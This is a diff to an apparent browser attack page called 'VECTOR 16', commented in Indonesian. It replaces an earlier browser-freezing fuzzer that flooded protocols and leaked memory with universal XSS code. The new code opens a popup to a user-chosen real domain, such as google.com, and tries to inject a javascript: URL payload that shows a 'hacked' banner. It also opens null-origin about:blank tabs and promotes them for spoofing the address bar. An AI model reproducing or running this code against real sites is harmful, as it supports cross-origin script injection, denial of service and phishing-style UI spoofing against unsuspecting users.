+    const targetDomain = prompt("Target domain untuk UXSS (contoh: https://www.google.com):", "https://www.google.com");
+    if (!targetDomain) return;
+    
+    // Buat popup ke target domain
+    addLog(`📡 Opening popup to ${targetDomain}...`, "");
+    
+    setTimeout(() => {
+        try {
+            // Buka popup ke target
+            const targetWin = window.open(targetDomain, "_blank");
+            if (targetWin) {
+                popupCount++;
+                updateUI();
+                addLog(`✅ Popup opened to ${targetDomain}`, "success");
+                
+                // Delay untuk memastikan page loaded, lalu inject via javascript: URL
+                setTimeout(() => {
+                    try {
+                        // UXSS payload untuk di-inject ke target domain
+                        const uxssCode = `
+                            (function() {
+                                alert('[VECTOR16] UXSS on ' + document.domain);
+                                var banner = document.createElement('div');
+                                banner.innerHTML = '🔥 VECTOR 16 UXSS - You\\'ve been hacked 🔥';
+                                banner.style.cssText = 'position:fixed;top:0;left:0;right:0;background:red;color:white;z-index:999999;text-align:center;padding:15px;font-size:18px;font-weight:bold';
+                                document.body.appendChild(banner);
+                                console.log('[VECTOR16] UXSS injected to', document.domain);
+                            })();
+                        `;
+                        
+                        // Reload target window with javascript: payload
+                        targetWin.location.href = `javascript:${encodeURIComponent(uxssCode)}`;
+                        addLog(`🎯 UXSS payload injected to ${targetDomain}`, "uxss");
+                    } catch(e) {
+                        addLog(`Cross-origin blocked: ${e.message}`, "");
+                        addLog("⚠️ UXSS via window.opener requires specific vulnerability", "");
+                    }
+                }, 2000);
+            } else {
+                addLog("❌ Popup blocked! Izinkan popup untuk UXSS", "warning");
+            }
+        } catch(e) {
+            addLog(`Error: ${e.message}`, "");
+        }
+    }, 500);
+}
+
+// ============ OPEN TAB WITHOUT ORIGIN ============
+function openNoOriginTab() {
+    addLog("📌 Opening tab with no origin (about:blank + null origin)", "");
+    
+    // Teknik: about:blank memiliki origin null
+    const blankWin = window.open("about:blank", "_blank");
+    if (blankWin) {
+        popupCount++;
+        updateUI();
+        
+        blankWin.document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head><title>No Origin Tab - VECTOR16</title></head>
+            <body style="background:#0a0a0a;color:#00ffaa;font-family:monospace;padding:20px">
+                <h1 style="color:#ff3b30">⚡ NO ORIGIN TAB ⚡</h1>
+                <p>This tab has <b>NO ORIGIN</b> (about:blank)</p>
+                <p>Origin: <span style="color:#ff6600" id="originInfo"></span></p>
+                <p>Address bar is BLANK (spoofed)</p>
+                <hr>
+                <h3>🔥 UXSS Test</h3>
+                <button onclick="alert('UXSS from no-origin tab! Origin: ' + (location.origin || 'null'))">Test Alert</button>
+                <script>
+                    document.getElementById('originInfo').innerText = location.origin || '(null)';
+                    console.log('No origin tab created by VECTOR16');
+                <\/script>
+            </body>
+            </html>
+        `);
+        blankWin.document.close();
+        addLog("✅ Tab dengan NO ORIGIN created (about:blank)", "success");
     } else {
-        addLog("⚠️ Fuzzer sedang berjalan - browser sedang freeze!", "warning");
+        addLog("⚠️ Popup blocked - izinkan popup", "warning");
     }
 }
 
-// Warning sebelum unload
+// ============ ADDITIONAL UXSS TECHNIQUES ============
+function delayedNoOriginPopup() {
+    addLog("⏱️ Creating delayed no-origin popup...", "");
+    
+    setTimeout(() => {
+        const win = window.open("about:blank", "_blank");
+        if (win) {
+            popupCount++;
+            updateUI();
+            win.document.write("<h1>Delayed No-Origin Popup</h1><p>Created with delay technique</p>");
+            win.document.close();
+            addLog("✅ Delayed no-origin popup created", "success");
+        }
+    }, 1000);
+}
+
+// Event listener untuk menangkap popup blocker
 window.addEventListener('beforeunload', function(e) {
-    if (isRunning) {
-        e.preventDefault();
-        e.returnValue = "VECTOR 16 fuzzer sedang berjalan. Browser akan freeze.";
-        return "VECTOR 16 fuzzer sedang berjalan. Browser akan freeze.";
+    if (popupCount > 0) {
+        e.returnValue = "UXSS popups active";
     }
 });
 
 // Initial logs
-addLog("💀 VECTOR 16 - PERMANENT BRUTAL FUZZER READY", "crash");
-addLog("⚠️ KLIK 'RUN PERMANENT FUZZER' - BROWSER AKAN FREEZE TOTAL", "crash");
-addLog("💀 TANPA SPAM WINDOW - MURNI PROTOCOL FLOOD + MEMORY LEAK", "crash");
+addLog("⚡ VECTOR 16 - BLANK ADDRESS BAR + UXSS LOADED", "success");
+addLog("📌 Address bar bisa dikosongkan (klik 'HILANGKAN ADDRESS BAR TEXT')", "");
+addLog("🌐 UXSS + Delay Popup: Membuka popup tanpa origin ke domain lain", "uxss");
+addLog("💡 Izinkan popup browser untuk UXSS maksimal", "info");
+
+// Auto-clear address bar on load? Optional
+setTimeout(() => {
+    addLog("💡 Tips: Gunakan 'HILANGKAN ADDRESS BAR TEXT' untuk spoofing", "");
+}, 1000);
 </script>
 </body>
 </html>
